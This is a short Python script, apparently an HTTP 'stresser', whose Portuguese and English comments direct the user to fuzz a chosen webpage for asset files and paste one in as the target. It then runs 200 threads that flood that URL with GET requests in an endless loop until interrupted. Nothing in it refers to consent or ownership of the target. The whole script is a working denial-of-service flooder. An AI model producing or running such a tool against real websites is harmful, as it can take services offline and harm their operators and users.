import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


#utilize um http fuzzer para descobrir arquivos de assets na webpage que deseja utilizar o stresser e cole no "TARGET_URL"
#use a httpfuzz to discover assets directories on a web page and paste on "TARGET_URL"
TARGET_URL = ""
NUM_REQUESTS = 1000
CONCURRENT_THREADS = 200 


stop_event = threading.Event()

def make_request():
    while not stop_event.is_set():
        try:
            response = requests.get(TARGET_URL, timeout=10)
            print(f"Status: {response.status_code}, Size: {len(response.content)} bytes")
        except requests.exceptions.RequestException as e:
            print(f"Erro na requisição: {e}")

def main():
    with ThreadPoolExecutor(max_workers=CONCURRENT_THREADS) as executor:
        
        futures = [executor.submit(make_request) for _ in range(CONCURRENT_THREADS)]
        try:
            for future in as_completed(futures):
                future.result()  
        except KeyboardInterrupt:
            print("Parando o teste...")
            stop_event.set()  

if __name__ == "__main__":
    main()
